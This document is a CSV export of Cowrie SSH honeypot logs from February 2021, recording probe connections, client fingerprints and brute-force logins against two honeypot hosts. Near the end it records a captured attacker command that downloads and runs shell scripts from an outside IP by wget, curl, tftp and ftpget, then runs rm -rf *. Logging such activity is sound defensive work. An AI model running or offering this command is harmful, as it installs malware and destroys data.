eventid,timestamp,src_ip,dst_ip,session,duration,message
cowrie.client.kex,2021-02-12 21:16:24.536904+00:00,221.181.185.135,,7eee5b98dbca,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 21:16:25.839460+00:00,221.181.185.135,,daef1b004ebc,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 21:16:28.565134+00:00,221.181.185.135,,daef1b004ebc,4.587241172790527,Connection lost after 4 seconds
cowrie.session.closed,2021-02-12 21:16:28.596487+00:00,221.181.185.135,,7eee5b98dbca,4.608458042144775,Connection lost after 4 seconds
cowrie.session.connect,2021-02-12 21:25:35.231954+00:00,221.181.185.223,155.232.195.83,8c58f59f7a31,,New connection: 221.181.185.223:26218 (155.232.195.83:2222) [session: 8c58f59f7a31]
cowrie.session.connect,2021-02-12 21:25:35.279733+00:00,221.181.185.223,155.232.195.82,9eb713782b33,,New connection: 221.181.185.223:63057 (155.232.195.82:2222) [session: 9eb713782b33]
cowrie.client.version,2021-02-12 21:25:38.495040+00:00,221.181.185.223,,8c58f59f7a31,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 21:25:38.496644+00:00,221.181.185.223,,8c58f59f7a31,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.version,2021-02-12 21:25:38.562693+00:00,221.181.185.223,,9eb713782b33,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 21:25:38.563811+00:00,221.181.185.223,,9eb713782b33,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 21:25:40.751525+00:00,221.181.185.223,,9eb713782b33,5.470277786254883,Connection lost after 5 seconds
cowrie.session.closed,2021-02-12 21:25:41.222239+00:00,221.181.185.223,,8c58f59f7a31,5.988674640655518,Connection lost after 5 seconds
cowrie.session.connect,2021-02-12 21:48:27.125784+00:00,206.189.111.9,155.232.195.83,6dbd60a2e431,,New connection: 206.189.111.9:45954 (155.232.195.83:2222) [session: 6dbd60a2e431]
cowrie.session.connect,2021-02-12 21:48:27.163200+00:00,206.189.111.9,155.232.195.82,d4cb2de6e44a,,New connection: 206.189.111.9:55814 (155.232.195.82:2222) [session: d4cb2de6e44a]
cowrie.session.closed,2021-02-12 21:48:27.309070+00:00,206.189.111.9,,6dbd60a2e431,0.18168854713439903,Connection lost after 0 seconds
cowrie.session.closed,2021-02-12 21:48:27.348943+00:00,206.189.111.9,,d4cb2de6e44a,0.184300422668457,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 21:50:06.502586+00:00,221.181.185.140,155.232.195.82,879958c67324,,New connection: 221.181.185.140:16822 (155.232.195.82:2222) [session: 879958c67324]
cowrie.client.version,2021-02-12 21:50:06.504326+00:00,221.181.185.140,,879958c67324,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 21:50:06.509789+00:00,221.181.185.140,155.232.195.83,9d781ff090ef,,New connection: 221.181.185.140:25451 (155.232.195.83:2222) [session: 9d781ff090ef]
cowrie.client.version,2021-02-12 21:50:06.511289+00:00,221.181.185.140,,9d781ff090ef,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 21:50:07.044387+00:00,221.181.185.140,,879958c67324,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 21:50:07.056721+00:00,221.181.185.140,,9d781ff090ef,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 21:50:09.238333+00:00,221.181.185.140,,9d781ff090ef,2.727120399475097,Connection lost after 2 seconds
cowrie.session.closed,2021-02-12 21:50:10.507591+00:00,221.181.185.140,,879958c67324,4.003401517868042,Connection lost after 4 seconds
cowrie.session.connect,2021-02-12 21:51:39.209551+00:00,221.181.185.135,155.232.195.82,efdc0d86b670,,New connection: 221.181.185.135:17989 (155.232.195.82:2222) [session: efdc0d86b670]
cowrie.client.version,2021-02-12 21:51:39.211272+00:00,221.181.185.135,,efdc0d86b670,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 21:51:39.214935+00:00,221.181.185.135,155.232.195.83,9f43723b06ff,,New connection: 221.181.185.135:62831 (155.232.195.83:2222) [session: 9f43723b06ff]
cowrie.client.version,2021-02-12 21:51:39.216303+00:00,221.181.185.135,,9f43723b06ff,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 21:51:39.740323+00:00,221.181.185.135,,efdc0d86b670,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 21:51:39.752231+00:00,221.181.185.135,,9f43723b06ff,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 21:51:42.038080+00:00,221.181.185.135,,9f43723b06ff,2.821841239929199,Connection lost after 2 seconds
cowrie.session.closed,2021-02-12 21:51:42.385660+00:00,221.181.185.135,,efdc0d86b670,3.174526453018188,Connection lost after 3 seconds
cowrie.session.connect,2021-02-12 22:12:27.628250+00:00,8.38.53.138,155.232.195.82,a0f64f1aa276,,New connection: 8.38.53.138:61000 (155.232.195.82:2222) [session: a0f64f1aa276]
cowrie.session.closed,2021-02-12 22:12:27.916535+00:00,8.38.53.138,,a0f64f1aa276,0.286712646484375,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 22:13:39.054084+00:00,8.38.53.138,155.232.195.83,cb22ff782698,,New connection: 8.38.53.138:61000 (155.232.195.83:2222) [session: cb22ff782698]
cowrie.session.closed,2021-02-12 22:13:39.340297+00:00,8.38.53.138,,cb22ff782698,0.28486514091491705,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 22:14:49.579323+00:00,221.181.185.140,155.232.195.83,996953f1692f,,New connection: 221.181.185.140:36691 (155.232.195.83:2222) [session: 996953f1692f]
cowrie.client.version,2021-02-12 22:14:49.581058+00:00,221.181.185.140,,996953f1692f,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 22:14:49.639396+00:00,221.181.185.140,155.232.195.82,2907c975dd4f,,New connection: 221.181.185.140:28318 (155.232.195.82:2222) [session: 2907c975dd4f]
cowrie.client.version,2021-02-12 22:14:49.640960+00:00,221.181.185.140,,2907c975dd4f,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 22:14:50.107800+00:00,221.181.185.140,,996953f1692f,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 22:14:50.181908+00:00,221.181.185.140,,2907c975dd4f,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 22:14:52.748489+00:00,221.181.185.140,,996953f1692f,3.167573928833008,Connection lost after 3 seconds
cowrie.session.closed,2021-02-12 22:14:54.995291+00:00,221.181.185.140,,2907c975dd4f,5.354415416717529,Connection lost after 5 seconds
cowrie.session.connect,2021-02-12 22:16:36.323944+00:00,68.183.4.205,155.232.195.83,2371d1afe07a,,New connection: 68.183.4.205:40986 (155.232.195.83:2222) [session: 2371d1afe07a]
cowrie.session.connect,2021-02-12 22:16:36.378968+00:00,68.183.4.205,155.232.195.82,43d0fe412d5e,,New connection: 68.183.4.205:59476 (155.232.195.82:2222) [session: 43d0fe412d5e]
cowrie.session.closed,2021-02-12 22:16:36.508734+00:00,68.183.4.205,,2371d1afe07a,0.18319940567016602,Connection lost after 0 seconds
cowrie.session.closed,2021-02-12 22:16:36.563685+00:00,68.183.4.205,,43d0fe412d5e,0.1832857131958,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 22:26:58.623257+00:00,221.181.185.198,155.232.195.83,29c8c024c15d,,New connection: 221.181.185.198:22767 (155.232.195.83:2222) [session: 29c8c024c15d]
cowrie.client.version,2021-02-12 22:26:58.624681+00:00,221.181.185.198,,29c8c024c15d,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 22:26:58.685011+00:00,221.181.185.198,155.232.195.82,78a859cd9d97,,New connection: 221.181.185.198:10163 (155.232.195.82:2222) [session: 78a859cd9d97]
cowrie.client.version,2021-02-12 22:26:58.686555+00:00,221.181.185.198,,78a859cd9d97,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 22:26:59.174214+00:00,221.181.185.198,,29c8c024c15d,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 22:26:59.235333+00:00,221.181.185.198,,78a859cd9d97,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 22:27:01.376947+00:00,221.181.185.198,,29c8c024c15d,2.752387523651123,Connection lost after 2 seconds
cowrie.session.closed,2021-02-12 22:27:01.433064+00:00,221.181.185.198,,78a859cd9d97,2.746593236923217,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 22:33:24.074389+00:00,187.177.165.53,155.232.195.83,efd38310077f,,New connection: 187.177.165.53:54053 (155.232.195.83:2222) [session: efd38310077f]
cowrie.client.version,2021-02-12 22:33:24.344528+00:00,187.177.165.53,,efd38310077f,,Remote SSH version: b'SSH-2.0-libssh-0.3.0'
cowrie.session.closed,2021-02-12 22:33:24.617843+00:00,187.177.165.53,,efd38310077f,0.541874885559082,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 22:36:06.239388+00:00,118.36.41.96,155.232.195.82,de0150eb8670,,New connection: 118.36.41.96:42140 (155.232.195.82:2222) [session: de0150eb8670]
cowrie.client.version,2021-02-12 22:36:06.657554+00:00,118.36.41.96,,de0150eb8670,,Remote SSH version: b'SSH-2.0-libssh-0.3.0'
cowrie.session.closed,2021-02-12 22:36:07.078641+00:00,118.36.41.96,,de0150eb8670,0.837676048278808,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 22:39:22.143473+00:00,221.131.165.124,155.232.195.83,110769da19e1,,New connection: 221.131.165.124:16463 (155.232.195.83:2222) [session: 110769da19e1]
cowrie.client.version,2021-02-12 22:39:22.145452+00:00,221.131.165.124,,110769da19e1,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 22:39:22.153462+00:00,221.131.165.124,155.232.195.82,e4c87cdef1b9,,New connection: 221.131.165.124:32805 (155.232.195.82:2222) [session: e4c87cdef1b9]
cowrie.client.version,2021-02-12 22:39:22.154736+00:00,221.131.165.124,,e4c87cdef1b9,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 22:39:22.721211+00:00,221.131.165.124,,e4c87cdef1b9,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 22:39:25.727444+00:00,221.131.165.124,,110769da19e1,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 22:39:27.289314+00:00,221.131.165.124,,e4c87cdef1b9,5.134642362594604,Connection lost after 5 seconds
cowrie.session.closed,2021-02-12 22:39:27.992622+00:00,221.131.165.124,,110769da19e1,5.847306728363037,Connection lost after 5 seconds
cowrie.session.connect,2021-02-12 22:42:14.076341+00:00,187.177.165.53,155.232.195.83,a7e485ffa16d,,New connection: 187.177.165.53:54335 (155.232.195.83:2222) [session: a7e485ffa16d]
cowrie.client.version,2021-02-12 22:42:14.345923+00:00,187.177.165.53,,a7e485ffa16d,,Remote SSH version: b'SSH-2.0-libssh-0.7.3'
cowrie.client.kex,2021-02-12 22:42:14.617882+00:00,187.177.165.53,,a7e485ffa16d,,SSH client hassh fingerprint: c8c5fbf80b7b0a1b0e4de5e683f3c5ad
cowrie.login.success,2021-02-12 22:42:16.243836+00:00,187.177.165.53,,a7e485ffa16d,,login attempt [root/pwlaMow49AtnRgs] succeeded
cowrie.session.closed,2021-02-12 22:42:18.297411+00:00,187.177.165.53,,a7e485ffa16d,4.219512939453125,Connection lost after 4 seconds
cowrie.session.connect,2021-02-12 22:45:31.152255+00:00,45.33.69.235,155.232.195.82,fbe99a185a76,,New connection: 45.33.69.235:41772 (155.232.195.82:2222) [session: fbe99a185a76]
cowrie.session.closed,2021-02-12 22:45:31.388024+00:00,45.33.69.235,,fbe99a185a76,0.23420190811157202,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 22:47:04.012273+00:00,178.79.147.60,155.232.195.82,a6345468a28c,,New connection: 178.79.147.60:42114 (155.232.195.82:2222) [session: a6345468a28c]
cowrie.session.closed,2021-02-12 22:47:05.688637+00:00,178.79.147.60,,a6345468a28c,1.674777507781982,Connection lost after 1 seconds
cowrie.session.connect,2021-02-12 22:48:43.559304+00:00,118.36.41.96,155.232.195.82,632db2da1f7a,,New connection: 118.36.41.96:42554 (155.232.195.82:2222) [session: 632db2da1f7a]
cowrie.client.version,2021-02-12 22:48:43.978521+00:00,118.36.41.96,,632db2da1f7a,,Remote SSH version: b'SSH-2.0-libssh-0.7.3'
cowrie.client.kex,2021-02-12 22:48:44.400648+00:00,118.36.41.96,,632db2da1f7a,,SSH client hassh fingerprint: c8c5fbf80b7b0a1b0e4de5e683f3c5ad
cowrie.login.success,2021-02-12 22:48:46.576280+00:00,118.36.41.96,,632db2da1f7a,,login attempt [root/pwlaMow49AtnRgs] succeeded
cowrie.session.closed,2021-02-12 22:48:49.662336+00:00,118.36.41.96,,632db2da1f7a,6.101937770843506,Connection lost after 6 seconds
cowrie.session.connect,2021-02-12 22:50:10.611344+00:00,104.248.207.219,155.232.195.82,9b539c4c8beb,,New connection: 104.248.207.219:35386 (155.232.195.82:2222) [session: 9b539c4c8beb]
cowrie.session.connect,2021-02-12 22:50:10.630804+00:00,104.248.207.219,155.232.195.83,700f2844ee8f,,New connection: 104.248.207.219:50820 (155.232.195.83:2222) [session: 700f2844ee8f]
cowrie.session.closed,2021-02-12 22:50:10.795484+00:00,104.248.207.219,,9b539c4c8beb,0.18300104141235302,Connection lost after 0 seconds
cowrie.session.closed,2021-02-12 22:50:10.815347+00:00,104.248.207.219,,700f2844ee8f,0.18346071243286102,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 22:50:14.164106+00:00,35.161.55.221,155.232.195.82,4c1ddb6cb754,,New connection: 35.161.55.221:41211 (155.232.195.82:2222) [session: 4c1ddb6cb754]
cowrie.client.version,2021-02-12 22:50:14.165808+00:00,35.161.55.221,,4c1ddb6cb754,,Remote SSH version: b'GET / HTTP/1.1'
cowrie.session.closed,2021-02-12 22:50:14.167303+00:00,35.161.55.221,,4c1ddb6cb754,0.001634120941162,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 22:50:15.902442+00:00,45.33.69.235,155.232.195.82,5c7dff60b35a,,New connection: 45.33.69.235:32792 (155.232.195.82:2222) [session: 5c7dff60b35a]
cowrie.session.closed,2021-02-12 22:50:16.174227+00:00,45.33.69.235,,5c7dff60b35a,0.270210742950439,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 23:02:14.516827+00:00,221.181.185.148,155.232.195.82,cc847147462d,,New connection: 221.181.185.148:30272 (155.232.195.82:2222) [session: cc847147462d]
cowrie.client.version,2021-02-12 23:02:14.518538+00:00,221.181.185.148,,cc847147462d,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 23:02:14.531503+00:00,221.181.185.148,155.232.195.83,37c59faf3076,,New connection: 221.181.185.148:60869 (155.232.195.83:2222) [session: 37c59faf3076]
cowrie.client.version,2021-02-12 23:02:14.532807+00:00,221.181.185.148,,37c59faf3076,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 23:02:15.195898+00:00,221.181.185.148,,cc847147462d,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 23:02:15.218448+00:00,221.181.185.148,,37c59faf3076,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 23:02:22.123398+00:00,221.181.185.148,,cc847147462d,7.604995965957642,Connection lost after 7 seconds
cowrie.session.closed,2021-02-12 23:02:25.627957+00:00,221.181.185.148,,37c59faf3076,11.09521198272705,Connection lost after 11 seconds
cowrie.session.connect,2021-02-12 23:03:41.394102+00:00,221.181.185.223,155.232.195.82,66c20f8df573,,New connection: 221.181.185.223:34373 (155.232.195.82:2222) [session: 66c20f8df573]
cowrie.client.version,2021-02-12 23:03:41.395314+00:00,221.181.185.223,,66c20f8df573,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.session.connect,2021-02-12 23:03:41.450911+00:00,221.181.185.223,155.232.195.83,7a0fc95b0e46,,New connection: 221.181.185.223:52967 (155.232.195.83:2222) [session: 7a0fc95b0e46]
cowrie.client.version,2021-02-12 23:03:41.452007+00:00,221.181.185.223,,7a0fc95b0e46,,Remote SSH version: b'SSH-2.0-PUTTY'
cowrie.client.kex,2021-02-12 23:03:41.995952+00:00,221.181.185.223,,66c20f8df573,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.client.kex,2021-02-12 23:03:42.061279+00:00,221.181.185.223,,7a0fc95b0e46,,SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35
cowrie.session.closed,2021-02-12 23:03:44.372515+00:00,221.181.185.223,,66c20f8df573,2.977314710617065,Connection lost after 2 seconds
cowrie.session.closed,2021-02-12 23:03:47.722039+00:00,221.181.185.223,,7a0fc95b0e46,6.270108461380005,Connection lost after 6 seconds
cowrie.session.connect,2021-02-12 23:08:04.962956+00:00,46.101.170.78,155.232.195.83,e64487cf8831,,New connection: 46.101.170.78:53102 (155.232.195.83:2222) [session: e64487cf8831]
cowrie.session.closed,2021-02-12 23:08:05.164191+00:00,46.101.170.78,,e64487cf8831,0.199654817581176,Connection lost after 0 seconds
cowrie.session.connect,2021-02-12 23:08:15.735366+00:00,46.101.170.78,155.232.195.83,ee3cf2e0d80d,,New connection: 46.101.170.78:33490 (155.232.195.83:2222) [session: ee3cf2e0d80d]
cowrie.client.version,2021-02-12 23:08:15.737052+00:00,46.101.170.78,,ee3cf2e0d80d,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 23:08:15.926798+00:00,46.101.170.78,,ee3cf2e0d80d,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 23:08:16.703923+00:00,46.101.170.78,,ee3cf2e0d80d,,login attempt [root/root] failed
cowrie.session.closed,2021-02-12 23:08:17.894013+00:00,46.101.170.78,,ee3cf2e0d80d,2.157068729400634,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 23:08:25.535356+00:00,46.101.170.78,155.232.195.83,42b4aa2d2cce,,New connection: 46.101.170.78:40626 (155.232.195.83:2222) [session: 42b4aa2d2cce]
cowrie.client.version,2021-02-12 23:08:25.537041+00:00,46.101.170.78,,42b4aa2d2cce,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 23:08:25.739937+00:00,46.101.170.78,,42b4aa2d2cce,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 23:08:26.565524+00:00,46.101.170.78,,42b4aa2d2cce,,login attempt [root/123456] failed
cowrie.session.closed,2021-02-12 23:08:27.769547+00:00,46.101.170.78,,42b4aa2d2cce,2.232641696929931,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 23:08:34.750367+00:00,46.101.170.78,155.232.195.83,eee5b12a8900,,New connection: 46.101.170.78:47802 (155.232.195.83:2222) [session: eee5b12a8900]
cowrie.client.version,2021-02-12 23:08:34.751709+00:00,46.101.170.78,,eee5b12a8900,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 23:08:34.945639+00:00,46.101.170.78,,eee5b12a8900,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.success,2021-02-12 23:08:35.754247+00:00,46.101.170.78,,eee5b12a8900,,login attempt [root/admin] succeeded
cowrie.session.params,2021-02-12 23:08:36.173791+00:00,46.101.170.78,,eee5b12a8900,,[]
cowrie.command.input,2021-02-12 23:08:36.174716+00:00,46.101.170.78,,eee5b12a8900,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.67/sh; curl -O http://45.130.138.67/sh; chmod 777 sh; sh sh; tftp 45.130.138.67 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.67; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.67 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download.failed,2021-02-12 23:08:36.366570+00:00,46.101.170.78,,eee5b12a8900,,Attempt to download file(s) from URL (http://45.130.138.67/sh) failed
cowrie.session.file_download.failed,2021-02-12 23:08:36.568292+00:00,46.101.170.78,,eee5b12a8900,,Attempt to download file(s) from URL (http://45.130.138.67/sh) failed
cowrie.session.file_download.failed,2021-02-12 23:09:26.864747+00:00,46.101.170.78,,eee5b12a8900,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.67/.sh) failed
cowrie.session.connect,2021-02-12 23:09:26.868281+00:00,46.101.170.78,155.232.195.83,1c2c431d8ccd,,New connection: 46.101.170.78:55002 (155.232.195.83:2222) [session: 1c2c431d8ccd]
cowrie.session.connect,2021-02-12 23:09:26.869989+00:00,46.101.170.78,155.232.195.83,567b8a873d10,,New connection: 46.101.170.78:33926 (155.232.195.83:2222) [session: 567b8a873d10]
cowrie.session.connect,2021-02-12 23:09:26.871667+00:00,46.101.170.78,155.232.195.83,8aae35acefa0,,New connection: 46.101.170.78:41078 (155.232.195.83:2222) [session: 8aae35acefa0]
cowrie.session.connect,2021-02-12 23:09:26.873345+00:00,46.101.170.78,155.232.195.83,42ce36594f75,,New connection: 46.101.170.78:48232 (155.232.195.83:2222) [session: 42ce36594f75]
cowrie.session.connect,2021-02-12 23:09:26.875078+00:00,46.101.170.78,155.232.195.83,12771316ffb7,,New connection: 46.101.170.78:55458 (155.232.195.83:2222) [session: 12771316ffb7]
